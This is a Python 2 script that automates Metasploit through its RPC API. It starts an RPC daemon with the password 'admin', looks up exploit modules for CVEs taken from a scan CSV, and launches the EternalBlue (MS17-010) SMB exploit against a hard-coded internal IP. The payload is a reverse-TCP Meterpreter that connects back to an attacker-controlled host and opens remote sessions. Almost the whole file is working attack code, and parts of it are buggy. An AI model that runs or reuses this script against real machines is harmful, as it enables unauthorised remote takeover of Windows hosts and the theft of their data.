#!/usr/bin/env python

from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import os
import time
import utile
import csv
import ssl

os.system('msfrpcd -P admin -n -a 127.0.0.1')

line_with_positive = []
line_with_exploit = []
line_with_out = []
status_of_console = False

def console_reader(data_in_console):
	status_of_console= data_in_console['busy']
	console_data = data_in_console['data'].rstrip().split('\n')
	for line in console_data:
		if '[+]' in line:
			line_with_positive.append(line)
		elif 'exploit/' in line:
			line_with_exploit.append(line)
		else:
			line_with_out.append(line)	

	print status_of_console

client = MsfRpcClient("admin")
console = MsfRpcConsole(client, cb = console_reader)

utile.parcer_result_scannig("result_of_scannig.csv")

list_cve = []
list_host_exploit = []
list_temp = []

hitgh_vul = open("high_vul.csv","r")
lines=csv.reader(hitgh_vul)
for line in lines:
 	list_cve=line[1].split()
	line[1] = ""
 	for cve in list_cve:
 		console.execute("search "+str(cve)+"")
 		time.sleep(5)
 		while status_of_console:
 			time.sleep(5)
	list_temp.append(line[0])
	list_temp.append(str(line_with_exploit).split()[1])
	line_with_exploit = []
	list_host_exploit.append(list_temp)
	list_temps = []	
hitgh_vul.close()

exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = "192.168.43.228"
payload = client.modules.use('payload' , 'windows/x64/meterpreter/reverse_tcp')
payload['LHOST'] = '192.168.43.61'
exploit.execute(payload=payload)
print client.sessions.list
